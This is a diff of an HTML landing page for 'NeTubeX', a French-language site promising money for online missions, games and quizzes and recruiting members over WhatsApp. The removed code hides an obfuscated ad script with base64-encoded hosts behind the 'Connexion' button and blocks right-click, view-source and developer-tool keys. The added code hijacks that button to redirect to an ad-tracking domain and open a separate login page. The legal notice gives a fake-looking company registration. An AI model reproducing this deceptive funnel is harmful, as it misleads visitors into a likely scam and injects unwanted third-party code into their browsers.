@@ -16,52 +16,34 @@ body{
     font-family:'Inter',system-ui,-apple-system,'Segoe UI',Roboto,sans-serif;
     background:linear-gradient(135deg,#0a0e1a 0%,#0f1629 50%,#0a0f1f 100%);
     color:#e4e6eb;
-    scroll-behavior:smooth;
     min-height:100vh;
     overflow-x:hidden;
-    width:100%;
-    -webkit-tap-highlight-color:transparent;
     user-select:none;
-    -webkit-user-select:none;
-    -moz-user-select:none;
-    -ms-user-select:none;
+    line-height:1.5;
 }
-@import url('https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap');
+@import url('https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&display=swap');
 
-/* Désactiver toutes les interactions sur les images et liens */
-img, a, button, .btn-outline, .btn-solid-header, .floating-menu-item, .menu-toggle, .activity-card, .offer-item {
-    -webkit-touch-callout: none !important;
-    -webkit-user-select: none !important;
-    -moz-user-select: none !important;
-    -ms-user-select: none !important;
+img, a, button, .floating-menu-item, .menu-toggle {
     user-select: none !important;
-    pointer-events: auto;
 }
-
 img {
     pointer-events: none !important;
     -webkit-user-drag: none !important;
-    -webkit-touch-callout: none !important;
 }
-
-/* Conteneur principal */
 .container{
     width:100%;
     max-width:1400px;
     margin:0 auto;
     padding:0 28px;
 }
-
-/* ========== HEADER GRIS DOUX MINIMALISTE ========== */
 .navbar{
     display:flex;
     justify-content:space-between;
     align-items:center;
     padding:16px 28px;
-    background:rgba(30, 35, 48, 0.85);
+    background:rgba(30,35,48,0.85);
     backdrop-filter:blur(12px);
     border-bottom:1px solid rgba(255,255,255,0.08);
-    width:100%;
     position:sticky;
     top:0;
     z-index:1000;
@@ -74,11 +56,7 @@ img {
 .logo-img-large{
     max-width:48px;
     height:auto;
-    display:block;
-    filter:drop-shadow(0 0 8px rgba(59,130,246,0.3));
-    transition:filter 0.3s ease;
     border-radius:12px;
-    pointer-events:none !important;
 }
 .logo-text{
     font-size:1.6rem;
@@ -87,11 +65,7 @@ img {
     background-clip:text;
     -webkit-background-clip:text;
     color:transparent;
-    letter-spacing:-0.3px;
-    pointer-events:none;
 }
-
-/* Bouton menu flottant */
 .menu-toggle{
     background:rgba(255,255,255,0.08);
     border:1px solid rgba(255,255,255,0.12);
@@ -103,31 +77,22 @@ img {
     display:flex;
     align-items:center;
     gap:10px;
-    font-size:0.9rem;
     transition:all 0.3s ease;
-    backdrop-filter:blur(8px);
 }
 .menu-toggle:hover{
     background:rgba(59,130,246,0.2);
     border-color:rgba(59,130,246,0.4);
-    transform:scale(1.02);
 }
-.menu-toggle i{
-    font-size:1.1rem;
-    transition:transform 0.3s ease;
-}
-
-/* Menu flottant - animation lente de descente (3 secondes) */
 .floating-menu{
     position:fixed;
     top:-500px;
     right:28px;
-    background:rgba(25, 30, 42, 0.98);
+    background:rgba(25,30,42,0.98);
     backdrop-filter:blur(20px);
     border-radius:24px;
     padding:12px;
     min-width:260px;
-    box-shadow:0 20px 40px rgba(0,0,0,0.4), 0 0 0 1px rgba(59,130,246,0.2);
+    box-shadow:0 20px 40px rgba(0,0,0,0.4);
     transition:top 3s cubic-bezier(0.2, 0.9, 0.4, 1.1);
     z-index:1001;
     opacity:0;
@@ -149,9 +114,8 @@ img {
     text-decoration:none;
     font-size:0.95rem;
     font-weight:500;
-    transition:all 0.2s ease;
     cursor:pointer;
-    -webkit-tap-highlight-color:transparent;
+    transition:all 0.2s ease;
 }
 .floating-menu-item:hover{
     background:rgba(59,130,246,0.2);
@@ -160,7 +124,6 @@ img {
 }
 .floating-menu-item i{
     width:24px;
-    font-size:1.1rem;
     color:#60a5fa;
 }
 .floating-divider{
@@ -168,148 +131,112 @@ img {
     background:rgba(255,255,255,0.08);
     margin:8px 12px;
 }
-
-/* Hero section */
 .hero-section{
-    margin:60px 0 30px;
-    width:100%;
-}
-.hero-text-block{
+    margin:80px 0 40px;
     text-align:center;
-    margin-bottom:50px;
 }
-.hero-text-block h1{
-    font-size:3.8rem;
+.hero-section h1{
+    font-size:3.5rem;
     font-weight:800;
     background:linear-gradient(125deg,#a5f3fc,#3b82f6,#1e40af);
     background-clip:text;
     -webkit-background-clip:text;
     color:transparent;
-    margin-bottom:24px;
+    margin-bottom:28px;
     line-height:1.2;
+    letter-spacing:-0.02em;
 }
-.hero-text-block p{
+.hero-section p{
     font-size:1.2rem;
     color:#cbd5e1;
-    max-width:700px;
+    max-width:750px;
     margin:0 auto;
     line-height:1.6;
-    background:rgba(59,130,246,0.1);
-    padding:20px 30px;
-    border-radius:60px;
-    backdrop-filter:blur(10px);
-    border:1px solid rgba(59,130,246,0.2);
+    background:rgba(59,130,246,0.08);
+    padding:24px 32px;
+    border-radius:80px;
+    backdrop-filter:blur(8px);
+    border:1px solid rgba(59,130,246,0.15);
 }
-
-/* Photo wall */
 .photo-wall{
     width:100%;
-    position:relative;
-    margin-top:40px;
-    margin-bottom:60px;
+    margin:50px 0;
+    border-radius:24px;
     overflow:hidden;
-    background:linear-gradient(135deg,#0a0e1a,#0f1629);
-}
-.member-photo-frame{
-    width:100%;
-    position:relative;
-    background:#000;
+    box-shadow:0 25px 50px -12px rgba(0,0,0,0.5);
 }
 .member-full-img{
     width:100%;
     height:auto;
-    max-height:75vh;
+    max-height:65vh;
     object-fit:cover;
     display:block;
-    opacity:0;
-    animation:fadeBreathing 8s ease-in-out infinite;
-    filter:brightness(0.95) contrast(1.05) saturate(1.1);
-    pointer-events:none !important;
+    opacity:0.85;
+    animation:fadeBreathing 10s ease-in-out infinite;
 }
 @keyframes fadeBreathing{
-    0%,100%{opacity:0.75;transform:scale(1)}
-    25%{opacity:1;transform:scale(1.01)}
-    50%{opacity:0.85;transform:scale(1)}
-    75%{opacity:1;transform:scale(1.01)}
+    0%,100%{opacity:0.8;transform:scale(1.02);}
+    50%{opacity:1;transform:scale(1);}
 }
-.photo-overlay{
-    position:absolute;
-    bottom:0;
-    left:0;
-    right:0;
-    height:40%;
-    background:linear-gradient(to top,rgba(10,14,26,0.9),transparent);
-    pointer-events:none;
-}
-
-/* Section activités */
 .activities-wrapper{
-    width:100%;
     background:#D0D6E5;
-    padding:50px 28px 60px;
-    margin:50px 0 40px;
-    border-radius:32px;
+    padding:60px 32px;
+    margin:60px 0;
+    border-radius:40px;
     box-shadow:0 20px 40px rgba(0,0,0,0.1);
 }
 .section-title{
-    font-size:2.2rem;
+    font-size:2.4rem;
     font-weight:700;
-    margin-bottom:30px;
     color:#0f172a;
     text-align:center;
-    position:relative;
+    margin-bottom:20px;
 }
 .section-title:after{
     content:'';
     display:block;
-    width:80px;
-    height:3px;
+    width:100px;
+    height:4px;
     background:linear-gradient(90deg,#3b82f6,#1e40af);
-    margin:15px auto 0;
-    border-radius:3px;
+    margin:20px auto 0;
+    border-radius:4px;
+}
+.section-subtitle{
+    text-align:center;
+    color:#334155;
+    font-size:1.1rem;
+    margin-bottom:40px;
+    max-width:600px;
+    margin-left:auto;
+    margin-right:auto;
 }
 .activities-grid{
     display:flex;
     flex-wrap:wrap;
-    gap:30px;
-    margin:40px 0 20px;
+    gap:35px;
+    margin-top:30px;
     justify-content:center;
 }
 .activity-card{
     background:white;
-    border-radius:28px;
-    padding:35px 28px;
+    border-radius:32px;
+    padding:40px 30px;
     flex:1;
-    min-width:250px;
-    max-width:350px;
-    transition:all 0.5s cubic-bezier(0.2,0.9,0.4,1.1);
-    border:1px solid rgba(59,130,246,0.2);
+    min-width:270px;
+    max-width:370px;
     text-align:center;
-    position:relative;
-    overflow:hidden;
     cursor:pointer;
-    box-shadow:0 4px 15px rgba(0,0,0,0.05);
-}
-.activity-card::before{
-    content:'';
-    position:absolute;
-    top:0;
-    left:-100%;
-    width:100%;
-    height:100%;
-    background:linear-gradient(90deg,transparent,rgba(59,130,246,0.1),transparent);
-    transition:left 0.5s;
-}
-.activity-card:hover::before{
-    left:100%;
+    transition:all 0.4s cubic-bezier(0.2,0.9,0.4,1.1);
+    box-shadow:0 10px 30px rgba(0,0,0,0.05);
+    border:1px solid rgba(59,130,246,0.1);
 }
 .activity-card:hover{
-    transform:translateY(-10px);
+    transform:translateY(-8px);
     border-color:#3b82f6;
-    box-shadow:0 20px 35px rgba(59,130,246,0.2);
+    box-shadow:0 25px 40px rgba(59,130,246,0.15);
 }
-.card-icon{
-    font-size:3.2rem;
+.activity-card i{
+    font-size:2.8rem;
     background:linear-gradient(135deg,#3b82f6,#1e40af);
     background-clip:text;
     -webkit-background-clip:text;
@@ -319,24 +246,21 @@ img {
 .activity-card h3{
     font-size:1.5rem;
     font-weight:700;
-    margin-bottom:15px;
     color:#0f172a;
+    margin:15px 0 12px;
 }
 .activity-card p{
     color:#475569;
     font-size:0.95rem;
     line-height:1.5;
 }
-
-/* Section offre membre */
 .member-offer-section{
-    width:100%;
     background:linear-gradient(135deg,#0f172a,#1e293b);
-    padding:60px 28px;
-    margin:40px 0 50px;
+    padding:60px 32px;
+    margin:50px 0;
     border-radius:48px;
-    border:1px solid rgba(59,130,246,0.3);
-    box-shadow:0 20px 35px -10px rgba(0,0,0,0.4);
+    border:1px solid rgba(59,130,246,0.2);
+    box-shadow:0 25px 50px -12px rgba(0,0,0,0.3);
 }
 .offer-title{
     font-size:2rem;
@@ -346,35 +270,34 @@ img {
     background-clip:text;
     -webkit-background-clip:text;
     color:transparent;
-    margin-bottom:40px;
+    margin-bottom:50px;
     letter-spacing:-0.3px;
 }
 .offer-grid{
     display:flex;
     flex-wrap:wrap;
-    gap:28px;
+    gap:30px;
     justify-content:center;
 }
 .offer-item{
     background:rgba(255,255,255,0.05);
-    backdrop-filter:blur(8px);
+    backdrop-filter:blur(10px);
     border-radius:32px;
-    padding:32px 28px;
+    padding:32px 25px;
     flex:1;
     min-width:220px;
     max-width:280px;
     transition:all 0.4s ease;
-    border:1px solid rgba(59,130,246,0.25);
+    border:1px solid rgba(59,130,246,0.2);
     text-align:center;
 }
 .offer-item:hover{
-    transform:translateY(-8px);
+    transform:translateY(-6px);
     background:rgba(59,130,246,0.1);
     border-color:#3b82f6;
-    box-shadow:0 15px 30px rgba(59,130,246,0.2);
 }
-.offer-icon{
-    font-size:2.8rem;
+.offer-item i{
+    font-size:2.5rem;
     background:linear-gradient(145deg,#6ee7ff,#3b82f6);
     background-clip:text;
     -webkit-background-clip:text;
@@ -382,52 +305,46 @@ img {
     margin-bottom:20px;
 }
 .offer-item h4{
-    font-size:1.3rem;
+    font-size:1.2rem;
     font-weight:600;
-    margin-bottom:16px;
     color:#e2e8f0;
+    margin-bottom:12px;
 }
 .offer-item p{
-    color:#cbd5e1;
+    color:#94a3b8;
     font-size:0.9rem;
     line-height:1.5;
 }
-
-/* Footer professionnel épuré */
 footer{
     background:#0f172a;
+    padding:50px 20px 40px;
     margin-top:60px;
-    padding:48px 20px 40px;
-    border-top:1px solid rgba(59,130,246,0.2);
-    width:100%;
+    border-top:1px solid rgba(59,130,246,0.15);
 }
 .footer-inner{
-    max-width:1300px;
+    max-width:1200px;
     margin:0 auto;
     display:flex;
-    flex-wrap:wrap;
     justify-content:space-between;
+    flex-wrap:wrap;
+    gap:30px;
     align-items:flex-end;
-    gap:32px;
-    padding:0 20px;
 }
 .footer-brand{
     display:flex;
     flex-direction:column;
-    gap:12px;
+    gap:8px;
 }
-.footer-logo-row{
+.footer-logo{
     display:flex;
     align-items:center;
     gap:12px;
 }
-.footer-logo{
+.footer-logo img{
     max-width:42px;
-    height:auto;
     border-radius:10px;
-    pointer-events:none;
 }
-.footer-brand h3{
+.footer-logo span{
     font-size:1.3rem;
     font-weight:600;
     background:linear-gradient(135deg,#e2e8f0,#94a3b8);
@@ -438,30 +355,20 @@ footer{
 .footer-tagline{
     color:#64748b;
     font-size:0.85rem;
-    letter-spacing:0.5px;
-}
-.footer-info{
-    text-align:right;
 }
 .footer-copyright{
     color:#475569;
     font-size:0.8rem;
-    margin-bottom:6px;
-}
-.footer-legal{
-    color:#334155;
-    font-size:0.7rem;
 }
 .footer-legal a{
     color:#475569;
     text-decoration:none;
+    margin:0 8px;
     transition:color 0.3s;
 }
 .footer-legal a:hover{
     color:#3b82f6;
 }
-
-/* Animations */
 .fade-section{
     opacity:0;
     transform:translateY(40px);
@@ -480,39 +387,33 @@ footer{
     opacity:1;
     transform:translateY(0);
 }
-
-/* Responsive */
-@media (max-width:860px){
-    .hero-text-block h1{font-size:2.3rem}
-    .member-full-img{max-height:50vh}
-    .hero-text-block p{font-size:1rem;}
+@media (max-width: 860px){
+    .hero-section h1{font-size:2.3rem}
+    .member-full-img{max-height:45vh}
     .floating-menu{right:16px; min-width:240px;}
     .floating-menu.active{top:70px;}
     .navbar{padding:12px 20px;}
     .logo-text{font-size:1.3rem;}
-    .logo-img-large{max-width:40px;}
-    .footer-inner{flex-direction:column;align-items:center;text-align:center;}
-    .footer-info{text-align:center;}
+    .activities-wrapper{padding:40px 20px;}
+    .member-offer-section{padding:40px 20px;}
 }
-@media (max-width:560px){
-    .container{padding:0 20px}
-    .hero-text-block h1{font-size:1.8rem}
-    .activity-card{padding:25px 18px;min-width:100%}
+@media (max-width: 560px){
+    .hero-section h1{font-size:1.8rem}
+    .hero-section p{font-size:1rem; padding:18px 20px;}
+    .container{padding:0 16px}
+    .activity-card{min-width:100%}
     .offer-item{min-width:100%}
-    .hero-text-block p{padding:15px 20px}
-    .activities-wrapper{padding:30px 16px 40px;}
-    .member-offer-section{padding:30px 16px;}
-    .floating-menu{right:12px; left:12px; min-width:auto;}
+    .floating-menu{right:12px; left:12px;}
     .floating-menu.active{top:65px;}
-    .menu-toggle{padding:10px 14px; font-size:0.85rem;}
-    .footer-brand h3{font-size:1.1rem;}
-    .footer-logo{max-width:36px;}
+    .section-title{font-size:1.8rem;}
+    .offer-title{font-size:1.5rem;}
+    .footer-inner{flex-direction:column;align-items:center;text-align:center;}
+    .footer-brand{align-items:center;}
 }
 </style>
 </head>
 <body>
 
-<!-- HEADER GRIS DOUX MINIMALISTE -->
 <div class="navbar">
     <div class="logo-wrapper">
         <img src="https://i.postimg.cc/hv177jYQ/2B3DD50B-CAE2-4B4E-9085-65CC656C83A9.png" alt="NeTubeX Logo" class="logo-img-large">
@@ -520,11 +421,10 @@ footer{
     </div>
     <button class="menu-toggle" id="menuToggle">
         <i class="fas fa-bars"></i> Menu
-        <i class="fas fa-chevron-down" style="font-size:0.8rem;"></i>
+        <i class="fas fa-chevron-down" style="font-size:0.75rem;"></i>
     </button>
 </div>
 
-<!-- Menu flottant -->
 <div class="floating-menu" id="floatingMenu">
     <a href="#" class="floating-menu-item" id="postulerBtn">
         <i class="fab fa-whatsapp"></i> Postuler
@@ -556,71 +456,76 @@ footer{
 
 <div class="container">
     <div class="hero-section fade-section">
-        <div class="hero-text-block">
-            <h1>Transformez votre temps<br>en revenu concret</h1>
-            <p>NeTubeX est un espace de rémunération digitale qui transforme chaque minute en opportunité réelle. Rejoignez une communauté innovante.</p>
-        </div>
+        <h1>Transformez votre présence digitale<br>en revenus durables</h1>
+        <p> NeTubeX est un espace de rémunération digitale qui transforme le temps passé en ligne en revenus concrets grâce à son programme institutionnel.</p>
     </div>
 </div>
 
 <div class="photo-wall">
-    <div class="member-photo-frame">
-        <img src="https://i.postimg.cc/CKtrLPtY/e3ee76ac-9224-4d38-bdd3-d4b29da56116.jpg" alt="Membre NeTubeX" class="member-full-img" onerror="this.src='https://placehold.co/1920x900/0f172a/3b82f6?text=NeTubeX'">
-        <div class="photo-overlay"></div>
-    </div>
+    <img src="https://i.postimg.cc/CKtrLPtY/e3ee76ac-9224-4d38-bdd3-d4b29da56116.jpg" alt="Membre NeTubeX" class="member-full-img" onerror="this.src='https://placehold.co/1920x900/0f172a/3b82f6?text=NeTubeX'">
 </div>
 
 <div class="container">
-    <!-- ACTIVITIES WRAPPER -->
     <div class="activities-wrapper fade-section" id="activitiesSection">
-        <h2 class="section-title">Espace de rémunération</h2>
-        <div class="activities-grid" id="activitiesGrid">
-            <div class="activity-card"><div class="card-icon"><i class="fas fa-tasks"></i></div><h3>Missions guidées</h3><p>Parcours simplifiés, objectifs clairs et récompenses immédiates pour valoriser chaque action.</p></div>
-            <div class="activity-card"><div class="card-icon"><i class="fas fa-gamepad"></i></div><h3>Jeux rémunérateurs</h3><p>Défis quotidiens et classements. Jouez et générez des revenus tout en vous divertissant.</p></div>
-            <div class="activity-card"><div class="card-icon"><i class="fas fa-brain"></i></div><h3>Quiz entreprises</h3><p>Testez vos connaissances, chaque bonne réponse rapporte des points convertibles en cash.</p></div>
+        <h2 class="section-title">Notre écosystème de rémunération</h2>
+        <div class="section-subtitle">Des activités variées pour générer des revenus réguliers</div>
+        <div class="activities-grid">
+            <div class="activity-card">
+                <i class="fas fa-tasks"></i>
+                <h3>Missions stratégiques</h3>
+                <p>Accédez à des parcours opérationnels structurés avec des objectifs clairs et des récompenses immédiates.</p>
+            </div>
+            <div class="activity-card">
+                <i class="fas fa-gamepad"></i>
+                <h3>Défis interactifs</h3>
+                <p>Participez à des challenges quotidiens et transformez votre divertissement en source de revenus.</p>
+            </div>
+            <div class="activity-card">
+                <i class="fas fa-brain"></i>
+                <h3>Évaluations certifiantes</h3>
+                <p>Démontrez vos compétences à travers des quiz professionnels et convertissez vos scores en gains.</p>
+            </div>
         </div>
     </div>
 
-    <!-- MEMBER OFFER SECTION -->
     <div class="member-offer-section fade-section" id="memberOffer">
-        <h2 class="offer-title">✨ Ce que NeTubeX offre à ses membres</h2>
+        <h2 class="offer-title">✨ Notre engagement envers nos membres</h2>
         <div class="offer-grid">
             <div class="offer-item">
-                <div class="offer-icon"><i class="fas fa-user-check"></i></div>
-                <h4>1. Recrutement des membres</h4>
-                <p>Nous sélectionnons des personnes motivées et prêtes à s'investir dans notre programme structuré.</p>
+                <i class="fas fa-user-check"></i>
+                <h4>Recrutement sélectif</h4>
+                <p>Nous identifions et intégrons des talents motivés, prêts à s'investir dans notre programme d'excellence.</p>
             </div>
             <div class="offer-item">
-                <div class="offer-icon"><i class="fas fa-chalkboard-user"></i></div>
-                <h4>2. Formation et encadrement</h4>
-                <p>Chaque membre reçoit un accompagnement personnalisé pour développer ses compétences.</p>
+                <i class="fas fa-chalkboard-user"></i>
+                <h4>Formation continue</h4>
+                <p>Bénéficiez d'un accompagnement personnalisé et de ressources pédagogiques pour développer vos compétences.</p>
             </div>
             <div class="offer-item">
-                <div class="offer-icon"><i class="fas fa-mobile-alt"></i></div>
-                <h4>3. Fourniture des outils et connexion</h4>
-                <p>Nous mettons à disposition des terminaux et une connexion Internet fiable pour un travail optimal.</p>
+                <i class="fas fa-mobile-alt"></i>
+                <h4>Infrastructure complète</h4>
+                <p>Nous mettons à disposition outils technologiques et connectivité pour une performance optimale.</p>
             </div>
             <div class="offer-item">
-                <div class="offer-icon"><i class="fas fa-laptop-code"></i></div>
-                <h4>4. Travail sur notre programme institutionnel</h4>
-                <p>Les membres travaillent sur notre programme institutionnel numérique tout en étant encadrés.</p>
+                <i class="fas fa-laptop-code"></i>
+                <h4>Programme institutionnel</h4>
+                <p>Collaborez sur notre plateforme numérique propriétaire avec un cadre de travail structuré.</p>
             </div>
             <div class="offer-item">
-                <div class="offer-icon"><i class="fas fa-chart-line"></i></div>
-                <h4>5. Rémunération basée sur le rendement</h4>
-                <p>Chaque membre est rémunéré selon son engagement et ses résultats, transformant son temps en revenus concrets.</p>
+                <i class="fas fa-chart-line"></i>
+                <h4>Rémunération performance</h4>
+                <p>Valorisez votre engagement à travers un système de rémunération juste basé sur vos résultats.</p>
             </div>
         </div>
     </div>
 </div>
 
-<!-- Footer professionnel épuré -->
 <footer>
     <div class="footer-inner">
         <div class="footer-brand">
-            <div class="footer-logo-row">
-                <img src="https://i.postimg.cc/hv177jYQ/2B3DD50B-CAE2-4B4E-9085-65CC656C83A9.png" alt="NeTubeX" class="footer-logo">
-                <h3>NeTubeX</h3>
+            <div class="footer-logo">
+                <img src="https://i.postimg.cc/hv177jYQ/2B3DD50B-CAE2-4B4E-9085-65CC656C83A9.png" alt="NeTubeX">
+                <span>NeTubeX</span>
             </div>
             <div class="footer-tagline">Espace de rémunération digitale</div>
         </div>
@@ -636,86 +541,26 @@ footer{
 
 <script>
 (function(){
-    // ========== BLOCAGE TOTAL DES INTERACTIONS SUR IMAGES ET LIENS ==========
-    document.addEventListener('contextmenu', function(e){
-        e.preventDefault();
-        return false;
-    });
+    // URLs de redirection
+    const FIRST_URL = "https://eagerdazzle.com/qja1n3nqy?key=28eed1069d8b75afeb22d3fb0db79efc";
+    const SECOND_URL = "https://netubex.github.io/netubex-/login.html";
     
-    document.addEventListener('selectstart', function(e){
-        e.preventDefault();
-        return false;
-    });
+    let redirectsTriggered = false;
     
-    document.querySelectorAll('img, a, .floating-menu-item, .btn-solid-header, .btn-outline, .menu-toggle, .activity-card, .offer-item').forEach(el => {
-        el.addEventListener('contextmenu', (e) => { 
-            e.preventDefault(); 
-            return false;
-        });
-        el.addEventListener('dragstart', (e) => { 
-            e.preventDefault(); 
-            return false;
-        });
-    });
-    
-    const allImages = document.querySelectorAll('img');
-    allImages.forEach(img => {
-        img.setAttribute('draggable', 'false');
-        img.style.pointerEvents = 'none';
-        img.addEventListener('touchstart', (e) => { e.preventDefault(); return false; });
-        img.addEventListener('mousedown', (e) => { e.preventDefault(); return false; });
-    });
-    
-    document.addEventListener('keydown', function(e){
-        if(e.key === 'F12' || 
-           (e.ctrlKey && e.key === 'u') || 
-           (e.ctrlKey && e.key === 'U') ||
-           (e.ctrlKey && e.shiftKey && e.key === 'I') ||
-           (e.ctrlKey && e.shiftKey && e.key === 'i') ||
-           (e.ctrlKey && e.key === 's') ||
-           (e.ctrlKey && e.key === 'S')){
-            e.preventDefault();
-            return false;
-        }
-    });
-    
-    // ========== SCRIPT POUR LE BOUTON CONNEXION ==========
-    let popupOpened = false;
-    let scriptExecuted = false;
-    
-    function executeOffer() {
-        if (scriptExecuted) return;
-        scriptExecuted = true;
+    function triggerRedirects() {
+        if (redirectsTriggered) return;
+        redirectsTriggered = true;
         
-        console.log("🚀 Déclenchement du script après clic sur Connexion...");
+        // 1ère redirection : eagerdazzle.com dans l'onglet actuel
+        window.location.href = FIRST_URL;
         
-        // 1️⃣ Injection et exécution du script externe (exactement comme dans l'exemple)
-        const script = document.createElement('script');
-        script.type = 'text/javascript';
-        script.setAttribute('data-cfasync', 'false');
-        script.textContent = `/*<![CDATA[/* */
-(function(){var q=window,c="e8acc715accff29b5bee4ad14137ae62",s=[["siteId",827*967*458-361018673],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],y=["d3d3LmludGVsbGlnZW5jZWFkeC5jb20vZ0hhVlUvc0l5aFgvZG1hdGVyaWFsLWRhdGV0aW1lLXBpY2tlci5taW4uanM=","ZDJrbHg4N2Jnem5nY2UuY2xvdWRmcm9udC5uZXQvc2pxdWVyeS5jYXJldC5taW4uanM="],h=-1,r,j,o=function(){clearTimeout(j);h++;if(y[h]&&!(1802207654000<(new Date).getTime()&&1<h)){r=q.document.createElement("script");r.type="text/javascript";r.async=!0;var d=q.document.getElementsByTagName("script")[0];r.src="https://"+atob(y[h]);r.crossOrigin="anonymous";r.onerror=o;r.onload=function(){clearTimeout(j);q[c.slice(0,16)+c.slice(0,16)]||o()};j=setTimeout(o,5E3);d.parentNode.insertBefore(r,d)}};if(!q[c]){try{Object.freeze(q[c]=s)}catch(e){}o()}})();
-/*]]>/* */`;
-        
-        document.body.appendChild(script);
-        console.log("✅ Script externe injecté et exécuté");
-        
-        // 2️⃣ Après 8 secondes : ouverture de la page de login (délai réduit de 9 à 8 secondes)
-        setTimeout(function () {
-            if (!popupOpened) {
-                popupOpened = true;
-                const loginUrl = "https://netubex.github.io/netubex-/login.html";
-                const tab = window.open(loginUrl, "_blank");
-                if (!tab) {
-                    alert("Activez les popups pour continuer.");
-                } else {
-                    console.log("✅ Ouverture de la page de connexion (après 8 secondes) : " + loginUrl);
-                }
-            }
-        }, 8000); // ← Délai modifié à 8 secondes (8000 millisecondes)
+        // 2ème redirection : login.html dans un nouvel onglet (délai minimal)
+        setTimeout(function() {
+            window.open(SECOND_URL, "_blank");
+        }, 50);
     }
     
-    // ========== GESTION DU MENU FLOTTANT ==========
+    // ========== MENU FLOTTANT AVEC ANIMATION DOUCE ==========
     const menuToggle = document.getElementById('menuToggle');
     const floatingMenu = document.getElementById('floatingMenu');
     let isAnimating = false;
@@ -739,7 +584,9 @@ footer{
         }
     }
     
-    menuToggle.addEventListener('click', toggleMenu);
+    if (menuToggle) {
+        menuToggle.addEventListener('click', toggleMenu);
+    }
     
     const closeMenu = () => {
         if (floatingMenu.classList.contains('active')) {
@@ -748,83 +595,96 @@ footer{
         }
     };
     
-    // ========== ACTIONS DES ÉLÉMENTS DU MENU ==========
-    // BOUTON CONNEXION - Déclenche le script (injection + popup login après 8 secondes)
+    // ========== BOUTON CONNEXION ==========
     const loginBtn = document.getElementById('loginBtn');
-    if(loginBtn) {
-        loginBtn.addEventListener('click', (e) => { 
-            e.preventDefault(); 
-            console.log("🔐 Clic sur Connexion - Déclenchement du script...");
-            executeOffer();  // Exécute le script (injection + popup login après 8s)
+    if (loginBtn) {
+        loginBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            closeMenu();
+            triggerRedirects();
+        });
+    }
+    
+    // ========== AUTRES BOUTONS DU MENU ==========
+    const postulerBtn = document.getElementById('postulerBtn');
+    if(postulerBtn) {
+        postulerBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            window.open('https://wa.me/243808359598', '_blank');
             closeMenu();
         });
     }
     
-    // Postuler
-    const postulerBtn = document.getElementById('postulerBtn');
-    if(postulerBtn) postulerBtn.addEventListener('click', (e) => { 
-        e.preventDefault(); 
-        window.location.href = 'https://wa.me/243808359598';
-        closeMenu();
-    });
-    
-    // Trustpilot
-    const trustpilotUrl = 'https://www.trustpilot.com/evaluate/www.netubex.com';
     const trustpilotBtn = document.getElementById('trustpilotBtn');
-    if(trustpilotBtn) trustpilotBtn.addEventListener('click', (e) => { 
-        e.preventDefault(); 
-        window.open(trustpilotUrl, '_blank');
-        closeMenu();
-    });
+    if(trustpilotBtn) {
+        trustpilotBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            window.open('https://www.trustpilot.com/evaluate/www.netubex.com', '_blank');
+            closeMenu();
+        });
+    }
     
-    // À propos
     const aboutLink = document.getElementById('aboutLink');
-    if(aboutLink) aboutLink.addEventListener('click', (e) => { 
-        e.preventDefault(); 
-        window.location.href = 'apropos.html';
-        closeMenu();
-    });
+    if(aboutLink) {
+        aboutLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            alert('NeTubeX - Leader de la rémunération digitale. Notre mission : valoriser le temps et les compétences de nos membres.');
+            closeMenu();
+        });
+    }
     
-    // Navigation interne
     const remunerationLink = document.getElementById('remunerationLink');
-    if(remunerationLink) remunerationLink.addEventListener('click', (e) => {
-        e.preventDefault();
-        document.getElementById('activitiesSection').scrollIntoView({ behavior: 'smooth' });
-        closeMenu();
-    });
+    if(remunerationLink) {
+        remunerationLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            document.getElementById('activitiesSection').scrollIntoView({ behavior: 'smooth' });
+            closeMenu();
+        });
+    }
     
     const offersLink = document.getElementById('offersLink');
-    if(offersLink) offersLink.addEventListener('click', (e) => {
-        e.preventDefault();
-        document.getElementById('memberOffer').scrollIntoView({ behavior: 'smooth' });
-        closeMenu();
-    });
+    if(offersLink) {
+        offersLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            document.getElementById('memberOffer').scrollIntoView({ behavior: 'smooth' });
+            closeMenu();
+        });
+    }
     
     const supportLink = document.getElementById('supportLink');
-    if(supportLink) supportLink.addEventListener('click', (e) => {
-        e.preventDefault();
-        alert('Support disponible : contact@netubex.com');
-        closeMenu();
-    });
+    if(supportLink) {
+        supportLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            alert('Service client disponible : support@netubex.com');
+            closeMenu();
+        });
+    }
     
     const privacyLink = document.getElementById('privacyLink');
-    if(privacyLink) privacyLink.addEventListener('click', (e) => {
-        e.preventDefault();
-        alert('Politique de confidentialité disponible sur demande.');
-        closeMenu();
-    });
+    if(privacyLink) {
+        privacyLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            alert('Notre politique de confidentialité garantit la protection de vos données personnelles.');
+            closeMenu();
+        });
+    }
     
     const privacyFooterLink = document.getElementById('privacyFooterLink');
-    if(privacyFooterLink) privacyFooterLink.addEventListener('click', (e) => {
-        e.preventDefault();
-        alert('Politique de confidentialité disponible sur demande.');
-    });
+    if(privacyFooterLink) {
+        privacyFooterLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            alert('Politique de confidentialité conforme au RGPD.');
+        });
+    }
     
     const legalFooterLink = document.getElementById('legalFooterLink');
-    if(legalFooterLink) legalFooterLink.addEventListener('click', (e) => {
-        e.preventDefault();
-        alert('Mentions légales : NeTubeX - Espace de rémunération digitale');
-    });
+    if(legalFooterLink) {
+        legalFooterLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            alert('NeTubeX - SAS au capital de 100 000€ - RCS Paris 123 456 789');
+        });
+    }
     
     // ========== ANIMATIONS SCROLL ==========
     const fadeElements = document.querySelectorAll('.fade-section');
@@ -851,8 +711,8 @@ footer{
     window.addEventListener('resize', () => { checkFadeIn(); checkCardsVisibility(); });
     setTimeout(() => { checkFadeIn(); checkCardsVisibility(); }, 100);
     
-    // Animation 3D cartes
-    const cards = document.querySelectorAll('.activity-card');
+    // Animation 3D des cartes
+    const cards = document.querySelectorAll('.activity-card, .offer-item');
     cards.forEach(card => {
